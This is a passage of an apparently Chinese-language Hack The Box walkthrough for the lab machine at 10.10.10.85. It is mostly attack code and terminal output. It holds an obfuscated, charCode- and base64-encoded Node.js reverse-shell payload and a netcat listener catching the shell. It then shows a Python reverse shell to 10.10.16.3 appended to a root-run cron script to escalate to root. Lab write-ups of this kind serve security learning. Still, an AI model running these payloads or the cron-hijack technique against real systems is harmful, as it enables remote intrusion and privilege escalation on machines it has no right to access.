class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,46,119,114</span>,<span class="hljs-number">105,116,101,40</span>,<span class="hljs-number">34,67,111,110</span>,<span class="hljs-number">110,101,99,116</span>,<span class="hljs-number">101,100,33,92</span>,<span class="hljs-number">110,34,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">112,105,112,101</span>,<span class="hljs-number">40,115,104,46</span>,<span class="hljs-number">115,116,100,105</span>,<span class="hljs-number">110,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,115</span>,<span class="hljs-number">116,100,111,117</span>,<span class="hljs-number">116,46,112,105</span>,<span class="hljs-number">112,101,40,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,115</span>,<span class="hljs-number">116,100,101,114</span>,<span class="hljs-number">114,46,112,105</span>,<span class="hljs-number">112,101,40,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,111</span>,<span class="hljs-number">110,40,39,101</span>,<span class="hljs-number">120,105,116,39</span>,<span class="hljs-number">44,102,117,110</span>,<span class="hljs-number">99,116,105,111</span>,<span class="hljs-number">110,40,99,111</span>,<span class="hljs-number">100,101,44,115</span>,<span class="hljs-number">105,103,110,97</span>,<span class="hljs-number">108,41,123,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,99,108</span>,<span class="hljs-number">105,101,110,116</span>,<span class="hljs-number">46,101,110,100</span>,<span class="hljs-number">40,34,68,105</span>,<span class="hljs-number">115,99,111,110</span>,<span class="hljs-number">110,101,99,116</span>,<span class="hljs-number">101,100,33,92</span>,<span class="hljs-number">110,34,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">111,110,40,39</span>,<span class="hljs-number">101,114,114,111</span>,<span class="hljs-number">114,39,44,32</span>,<span class="hljs-number">102,117,110,99</span>,<span class="hljs-number">116,105,111,110</span>,<span class="hljs-number">40,101,41,32</span>,<span class="hljs-number">123,10,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,115,101</span>,<span class="hljs-number">116,84,105,109</span>,<span class="hljs-number">101,111,117,116</span>,<span class="hljs-number">40,99,40,72</span>,<span class="hljs-number">79,83,84,44</span>,<span class="hljs-number">80,79,82,84</span>,<span class="hljs-number">41,44,32,84</span>,<span class="hljs-number">73,77,69,79</span>,<span class="hljs-number">85,84,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,125,10,99</span>,<span class="hljs-number">40,72,79,83</span>,<span class="hljs-number">84,44,80,79</span>,<span class="hljs-number">82,84,41,59</span>,<span class="hljs-number">10</span>) )&#125;()&quot;&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJyY<span class="hljs-number">2</span>UiOiJfJCRORF<span class="hljs-number">9</span>GVU<span class="hljs-number">5</span>DJCRfZ<span class="hljs-symbol">nVuY3</span>Rpb<span class="hljs-number">24</span>gKCl<span class="hljs-number">7</span>IGV<span class="hljs-number">2</span>YWwoU<span class="hljs-number">3</span>RyaW<span class="hljs-number">5</span><span class="hljs-symbol">nLmZyb21</span>DaGFyQ<span class="hljs-number">29</span>kZSgxMCwxMTgsOTcsMTE<span class="hljs-number">0</span>LDMyLDExMCwxMDEsMTE<span class="hljs-number">2</span>LDMyLDYxLDMyLDEx<span class="hljs-symbol">NCwxMDEsMTEzLDExNywxMDUsMTE0</span>LDEwMSw<span class="hljs-number">0</span>MCwzOSwxMTAsMTAxLDEx<span class="hljs-symbol">NiwzOSw0</span>MSw<span class="hljs-number">1</span>OSwxMCwxMTgsOTcsMTE<span class="hljs-number">0</span>LDMyLDEx<span class="hljs-symbol">NSwxMTIsOTcsMTE5</span>LDExMCwzMiw<span class="hljs-number">2</span>MSwzMiwxMTQsMTAxLDExMywxMTcsMTA<span class="hljs-number">1</span>LDEx<span class="hljs-symbol">NCwxMDEsNDAsMzksOTksMTA0</span>LDEw<span class="hljs-symbol">NSwxMDgsMTAwLDk1</span>LDExMiwxMTQsMTExLDk<span class="hljs-number">5</span>LDEwMSwxMTUsMTE<span class="hljs-number">1</span>LD<span class="hljs-name">M5</span>LDQxLDQ<span class="hljs-number">2</span>LDEx<span class="hljs-symbol">NSwxMTIsOTcsMTE5</span>LDExMCw<span class="hljs-number">1</span>OSwxMCw<span class="hljs-number">3</span>Miw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Myw<span class="hljs-number">4</span><span class="hljs-symbol">NCw2</span>MSwz<span class="hljs-symbol">NCw0</span>OSw<span class="hljs-number">0</span>OCw<span class="hljs-number">0</span><span class="hljs-symbol">Niw0</span>OSw<span class="hljs-number">0</span>OCw<span class="hljs-number">0</span><span class="hljs-symbol">Niw0</span>OSw<span class="hljs-number">1</span><span class="hljs-symbol">NCw0</span><span class="hljs-symbol">Niw1</span>MSwz<span class="hljs-symbol">NCw1</span>OSwxMCw<span class="hljs-number">4</span>MCw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Miw<span class="hljs-number">4</span><span class="hljs-symbol">NCw2</span>MSwz<span class="hljs-symbol">NCw1</span>Miw<span class="hljs-number">1</span>Miw<span class="hljs-number">1</span>Miw<span class="hljs-number">1</span>Miwz<span class="hljs-symbol">NCw1</span>OSwxMCw<span class="hljs-number">4</span><span class="hljs-symbol">NCw3</span>Myw<span class="hljs-number">3</span><span class="hljs-symbol">Nyw2</span>OSw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span><span class="hljs-symbol">NSw4</span><span class="hljs-symbol">NCw2</span>MSwz<span class="hljs-symbol">NCw1</span>Myw<span class="hljs-number">0</span>OCw<span class="hljs-number">0</span>OCw<span class="hljs-number">0</span>OCwz<span class="hljs-symbol">NCw1</span>OSwxMCwxMDUsMTAyLDMyLDQwLDEx<span class="hljs-symbol">NiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1</span>LDExMCwxMDMs<span class="hljs-symbol">NDYsMTEyLDExNCwxMTEsMTE2</span>LDExMSwxMTYsMTIxLDExMiwxMDEs<span class="hljs-symbol">NDYsOTksMTExLDExMCwxMTYsOTcsMTA1</span>LDExMCwxMTUsMzIs<span class="hljs-symbol">NjEsNjEsNjEsMzIsMzksMTE3</span>LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzks<span class="hljs-symbol">NDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1</span>LDExMCwxMDMs<span class="hljs-symbol">NDYsMTEyLDExNCwxMTEsMTE2</span>LDExMSwxMTYsMTIxLDExMiwxMDEs<span class="hljs-symbol">NDYsOTksMTExLDExMCwxMTYsOTcsMTA1</span>LDExMCwxMTUsMzIs<span class="hljs-symbol">NjEsMzIsMTAyLDExNywxMTAsOTksMTE2</span>LDEw<span class="hljs-symbol">NSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2</span>LDEx<span class="hljs-symbol">NywxMTQsMTEwLDMyLDExNiwxMDQsMTA1</span>LDEx<span class="hljs-symbol">NSw0</span><span class="hljs-symbol">NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5</span>LDEwMiw<span class="hljs-number">0</span>MCwxMDUsMTE<span class="hljs-number">2</span>LDQxLDMyLDMzLDYxLDMyLDQ<span class="hljs-number">1</span>LDQ<span class="hljs-number">5</span>LDU<span class="hljs-number">5</span>LDMyLDEy<span class="hljs-symbol">NSw1</span>OSwzMiwxMjUsMTAsMTAyLDEx<span class="hljs-symbol">NywxMTAsOTksMTE2</span>LDEw<span class="hljs-symbol">NSwxMTEsMTEwLDMyLDk5</span>LDQwLDcyLDc<span class="hljs-number">5</span>LDgzLD<span class="hljs-name">g0</span>LDQ<span class="hljs-number">0</span>LDgwLDc<span class="hljs-number">5</span>LDgyLD<span class="hljs-name">g0</span>LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE<span class="hljs-number">0</span>LDMyLDk<span class="hljs-number">5</span>LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIs<span class="hljs-symbol">NjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5</span>LDEw<span class="hljs-symbol">NywxMDEsMTE2</span>LDQwLDQxLDU<span class="hljs-number">5</span>LDEwLDMyLDMyLDMyLDMyLDk<span class="hljs-number">5</span>LDEwOCwxMDUsMTAxLDExMCwxMTYs<span class="hljs-symbol">NDYsOTksMTExLDExMCwxMTAsMTAxLDk5</span>LDEx<span class="hljs-symbol">Niw0</span>MCw<span class="hljs-number">4</span>MCw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Miw<span class="hljs-number">4</span><span class="hljs-symbol">NCw0</span><span class="hljs-symbol">NCwzMiw3</span>Miw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Myw<span class="hljs-number">4</span><span class="hljs-symbol">NCw0</span><span class="hljs-symbol">NCwzMiwxMDIsMTE3</span>LDExMCw<span class="hljs-number">5</span>OSwxMTYsMTA<span class="hljs-number">1</span>LDExMSwxMTAs<span class="hljs-symbol">NDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5</span><span class="hljs-symbol">NywxMTQsMzIsMTE1</span>LDEw<span class="hljs-symbol">NCwzMiw2</span>MSwzMiwxMTUsMTEyLDk<span class="hljs-number">3</span>LDExOSwxMTAs<span class="hljs-symbol">NDAsMzksNDcsOTgsMTA1</span>LDExMCw<span class="hljs-number">0</span><span class="hljs-symbol">NywxMTUsMTA0</span>LD<span class="hljs-name">M5</span>LDQ<span class="hljs-number">0</span>LDkxLDkzLDQxLDU<span class="hljs-number">5</span>LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk<span class="hljs-number">5</span>LDEwOCwxMDUsMTAxLDExMCwxMTYs<span class="hljs-symbol">NDYsMTE5</span>LDEx<span class="hljs-symbol">NCwxMDUsMTE2</span>LDEwMSw<span class="hljs-number">0</span>MCwz<span class="hljs-symbol">NCw2</span><span class="hljs-symbol">NywxMTEsMTEwLDExMCwxMDEsOTksMTE2</span>LDEwMSwxMDAsMzMsOTIsMTEwLD<span class="hljs-name">M0</span>LDQxLDU<span class="hljs-number">5</span>LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk<span class="hljs-number">5</span>LDEwOCwxMDUsMTAxLDExMCwxMTYs<span class="hljs-symbol">NDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1</span>LDEx<span class="hljs-symbol">NiwxMDAsMTA1</span>LDExMCw<span class="hljs-number">0</span>MSw<span class="hljs-number">1</span>OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA<span class="hljs-number">0</span>LDQ<span class="hljs-number">2</span>LDEx<span class="hljs-symbol">NSwxMTYsMTAwLDExMSwxMTcsMTE2</span>LDQ<span class="hljs-number">2</span>LDExMiwxMDUsMTEyLDEwMSw<span class="hljs-number">0</span>MCw<span class="hljs-number">5</span>OSwxMDgsMTA<span class="hljs-number">1</span>LDEwMSwxMTAsMTE<span class="hljs-number">2</span>LDQxLDU<span class="hljs-number">5</span>LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEx<span class="hljs-symbol">NSwxMDQsNDYsMTE1</span>LDEx<span class="hljs-symbol">NiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5</span>LDEwOCwxMDUsMTAxLDExMCwxMTYs<span class="hljs-symbol">NDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1</span>LDEw<span class="hljs-symbol">NCw0</span><span class="hljs-symbol">NiwxMTEsMTEwLDQwLDM5</span>LDEwMSwxMjAsMTA<span class="hljs-number">1</span>LDEx<span class="hljs-symbol">NiwzOSw0</span><span class="hljs-symbol">NCwxMDIsMTE3</span>LDExMCw<span class="hljs-number">5</span>OSwxMTYsMTA<span class="hljs-number">1</span>LDExMSwxMTAs<span class="hljs-symbol">NDAsOTksMTExLDEwMCwxMDEsNDQsMTE1</span>LDEw<span class="hljs-symbol">NSwxMDMsMTEwLDk3</span>LDEwOCw<span class="hljs-number">0</span>MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA<span class="hljs-number">4</span>LDEw<span class="hljs-symbol">NSwxMDEsMTEwLDExNiw0</span><span class="hljs-symbol">NiwxMDEsMTEwLDEwMCw0</span>MCwz<span class="hljs-symbol">NCw2</span>OCwxMDUsMTE<span class="hljs-number">1</span>LDk<span class="hljs-number">5</span>LDExMSwxMTAsMTEwLDEwMSw<span class="hljs-number">5</span>OSwxMTYsMTAxLDEwMCwzMyw<span class="hljs-number">5</span>MiwxMTAsMzQs<span class="hljs-symbol">NDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1</span>LDQxLDU<span class="hljs-number">5</span>LDEwLDMyLDMyLDMyLDMyLDEy<span class="hljs-symbol">NSw0</span>MSw<span class="hljs-number">1</span>OSwxMCwzMiwzMiwzMiwzMiw<span class="hljs-number">5</span>OSwxMDgsMTA<span class="hljs-number">1</span>LDEwMSwxMTAsMTE<span class="hljs-number">2</span>LDQ<span class="hljs-number">2</span>LDExMSwxMTAs<span class="hljs-symbol">NDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0</span><span class="hljs-symbol">NCwzMiwxMDIsMTE3</span>LDExMCw<span class="hljs-number">5</span>OSwxMTYsMTA<span class="hljs-number">1</span>LDExMSwxMTAs<span class="hljs-symbol">NDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4</span><span class="hljs-symbol">NCwxMDUsMTA5</span>LDEwMSwxMTEsMTE<span class="hljs-number">3</span>LDEx<span class="hljs-symbol">Niw0</span>MCw<span class="hljs-number">5</span>OSw<span class="hljs-number">0</span>MCw<span class="hljs-number">3</span>Miw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Myw<span class="hljs-number">4</span><span class="hljs-symbol">NCw0</span><span class="hljs-symbol">NCw4</span>MCw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Miw<span class="hljs-number">4</span><span class="hljs-symbol">NCw0</span>MSw<span class="hljs-number">0</span><span class="hljs-symbol">NCwzMiw4</span><span class="hljs-symbol">NCw3</span>Myw<span class="hljs-number">3</span><span class="hljs-symbol">Nyw2</span>OSw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span><span class="hljs-symbol">NSw4</span><span class="hljs-symbol">NCw0</span>MSw<span class="hljs-number">1</span>OSwxMCwzMiwzMiwzMiwzMiwxMjUs<span class="hljs-symbol">NDEsNTksMTAsMTI1</span>LDEwLDk<span class="hljs-number">5</span>LDQwLDcyLDc<span class="hljs-number">5</span>LDgzLD<span class="hljs-name">g0</span>LDQ<span class="hljs-number">0</span>LDgwLDc<span class="hljs-number">5</span>LDgyLD<span class="hljs-name">g0</span>LDQxLDU<span class="hljs-number">5</span>LDEwKSApfSgpI<span class="hljs-symbol">n0</span>=<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220408141824523.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408141824523" style="zoom:200%;" />
+
+<p>在进行提交时服务端会返回无效的username，但是没关系，可以正常收到反向shell链接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.85] 48860<br>Connected!<br>uid<br>/bin/sh: 1: uid: not found<br><span class="hljs-built_in">id</span><br>uid=1000(sun) gid=1000(sun) <span class="hljs-built_in">groups</span>=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br></code></pre></td></tr></table></figure>
+
+<p>可以检测一下目标有无python环境，一般都是有的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br></code></pre></td></tr></table></figure>
+
+<p>那我可以升级一下shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>我找到了user.txt:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">sun@sun:~$ find / -name user.txt<br>find / -name user.txt<br>find: ‘/tmp/systemd-private-6285fa43ec854497a6b87d7c1eab3ed8-colord.service-MBDXg2’: Permission denied<br>find: ‘/tmp/vmware-root’: Permission denied<br>find: ‘/tmp/systemd-private-6285fa43ec854497a6b87d7c1eab3ed8-systemd-timesyncd.service-yO3LB8’: Permission denied<br>find: ‘/tmp/systemd-private-6285fa43ec854497a6b87d7c1eab3ed8-rtkit-daemon.service-Yc1yyh’: Permission denied<br>find: ‘/home/sun/.gvfs’: Permission denied<br>find: ‘/home/sun/.cache/dconf’: Permission denied<br>find: ‘/home/sun/.dbus’: Permission denied<br>/home/sun/Documents/user.txt<br>find: ‘/etc/ssl/private’: Permission denied<br>find: ‘/etc/polkit-1/localauthority’: Permission denied<br>find: ‘/etc/cups/ssl’: Permission denied<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sun@sun:~/Documents$ <span class="hljs-built_in">ls</span> -all<br><span class="hljs-built_in">ls</span> -all<br>total 16<br>drwxr-xr-x  2 sun sun 4096 Mar  4  2018 .<br>drwxr-xr-x 21 sun sun 4096 Apr  8 00:47 ..<br>-rw-rw-r--  1 sun sun   29 Sep 21  2017 script.py<br>-rw-rw-r--  1 sun sun   33 Sep 21  2017 user.txt<br></code></pre></td></tr></table></figure>
+
+<p>在目录中还有一个script.py脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sun@sun:~/Documents$ <span class="hljs-built_in">cat</span> script.py<br><span class="hljs-built_in">cat</span> script.py<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Script is running...&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>而在上级目录有一个output.txt中的字符信息与脚本像是存在关联：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sun@sun:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>Desktop    Downloads         Music         output.txt  Public     Templates<br>Documents  examples.desktop  node_modules  Pictures    server.js  Videos<br>sun@sun:~$ <span class="hljs-built_in">cat</span> output.txt<br><span class="hljs-built_in">cat</span> output.txt<br>Script is running...<br></code></pre></td></tr></table></figure>
+
+<p>那我可能需要知道这两个文件之中是否真的存在关联，我可以去看一下系统日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/log<br><br><span class="hljs-built_in">cat</span> syslog<br></code></pre></td></tr></table></figure>
+
+<p>在日志最底部找到了这样的信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apr  8 02:35:01 sun CRON[4992]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>sun@sun:/var/log$ <br></code></pre></td></tr></table></figure>
+
+<p>在日志内还有一堆相关信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apr  8 01:45:01 sun CRON[4714]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 01:47:13 sun org.gnome.evolution.dataserver.Sources5[3526]: ** (evolution-source-registry:3807): WARNING **: secret_service_search_sync: must specify at least one attribute to match<br>Apr  8 01:50:01 sun CRON[4744]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 01:55:01 sun CRON[4762]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 02:00:01 sun CRON[4782]: (sun) CMD (nodejs /home/sun/server.js &gt;/dev/null 2&gt;&amp;1)<br>Apr  8 02:00:01 sun CRON[4783]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 02:00:36 sun kernel: [ 4419.527491] perf interrupt took too long (5034 &gt; 5000), lowering kernel.perf_event_max_sample_rate to 25000<br>Apr  8 02:05:01 sun CRON[4806]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 02:10:01 sun CRON[4825]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 02:15:01 sun CRON[4843]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 02:17:01 sun CRON[4855]: (root) CMD (   <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)<br>Apr  8 02:20:01 sun CRON[4865]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br></code></pre></td></tr></table></figure>
+
+<p>便于读者阅读，其中关键的信息我筛选了出来：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apr  8 01:50:01 sun CRON[4744]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt;<br>Apr  8 01:55:01 sun CRON[4762]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt;<br>Apr  8 02:00:01 sun CRON[4783]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt;<br></code></pre></td></tr></table></figure>
+
+<p>看起来每过5分钟root用户便会以自身root权限去执行python /home/sun/Documents/script.py并将其输出到/home/sun/output.txt，然而script.py是sun用户目录中的，sun对其是拥有完全控制权，也就是说我可以将其更改为我希望执行的python代码，例如用python建立一个反向shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.3&quot;,1334));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> &gt;&gt; script.py<br></code></pre></td></tr></table></figure>
+
+<p>等一会儿，便可如愿以偿的收到反向shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 1334<br>listening on [any] 1334 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.85] 37434<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string"># whoami</span><br><span class="hljs-string">root</span><br><span class="hljs-string">#cd root</span><br><span class="hljs-string"># ls</span><br><span class="hljs-string">root.txt</span><br><span class="hljs-string">script.py</span><br><span class="hljs-string"># cat root</span><br><span class="hljs-string">cat: root: No such file or directory</span><br><span class="hljs-string"># cat root.txt</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
